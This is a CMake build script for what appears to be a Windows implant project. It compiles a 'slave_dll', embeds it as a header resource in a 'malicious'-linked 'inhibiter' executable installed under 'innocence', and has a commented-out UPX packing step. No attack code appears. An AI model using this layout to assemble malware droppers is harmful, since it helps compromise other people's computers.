file(GLOB_RECURSE slave_dll_source_files dll/*)
add_library(slave_dll SHARED ${slave_dll_source_files})
set_target_properties(slave_dll PROPERTIES COMPILE_FLAGS ${BUILD_FLAGS_MT})
target_link_libraries(slave_dll system network blaspheme malicious common userenv)

add_custom_command(
	TARGET slave_dll
	POST_BUILD
	COMMAND "${BINGENERATOR}" "${SLAVE_DLL_PATH}" "${SLAVE_DLL_HPP_PATH}" "SlaveDll"
	COMMENT "Generating ${SLAVE_DLL_HPP_PATH} WITH ${SLAVE_DLL_PATH}"
)

file(GLOB_RECURSE inhibiter_source_files inhibiter/*)
add_executable(inhibiter WIN32 ${inhibiter_source_files})
set_target_properties(inhibiter PROPERTIES COMPILE_FLAGS ${BUILD_FLAGS_MT})

# substrate has to be built before inhibiter, because of resource inclusion
target_link_libraries(inhibiter common malicious system network slave_dll shlwapi)
install(TARGETS inhibiter RUNTIME DESTINATION innocence)

# UPX Compression
#if ( CMAKE_BUILD_TYPE MATCHES Debug)
#	message(STATUS "Compressing disabled")
#elseif( CMAKE_BUILD_TYPE MATCHES Release)
#	if(WIN32)
#		message(STATUS "Compression activee sur ${BINARY_OUTPUT}/inhibitor.exe WITH ${COMPRESSOR}")
#		add_custom_command(
#			TARGET inhibitor
#			POST_BUILD
#			COMMAND "C:/innocence/compress.bat"
#			COMMENT "Compressing ${BINARY_OUTPUT}/inhibitor.exe WITH ${COMPRESSOR}"
#		)
#	endif()
#endif ()
